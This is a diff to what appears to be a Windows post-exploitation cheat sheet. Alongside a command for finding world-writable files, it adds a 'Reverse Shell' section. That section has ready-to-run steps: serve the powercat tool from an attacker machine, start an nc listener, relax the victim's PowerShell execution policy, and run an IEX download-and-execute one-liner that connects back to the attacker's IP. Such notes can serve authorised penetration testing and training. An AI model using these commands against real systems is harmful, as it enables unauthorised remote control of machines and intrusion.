@@ -32,4 +32,16 @@ The first step when you have gained initial access to any machine would be to en
 - insecure files:
   - Get-ChildItem -Recurse C:\ | Get-Acl | Where-Object {($_.AccessToString -match "Everyone") -and ($_.AccessToString -match "FullControl")}
  
+# Reverse Shell
+
+Attacker's Machine:
+- git clone https://github.com/besimorhino/powercat && cd powercat
+- python3 -m http.server 8080
+- nc -lvnp 1337
+Victim's Machine:
+- Execution Policy:
+  - Get-ExecutionPolicy
+  - Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
+- Download and execute payload:
+  - IEX(New-Object System.Net.WebClient).DownloadString('http://[Attacker's IP]:8080/powercat.ps1'); powercat -c [Attacker's IP] -p 1337 -ep
 
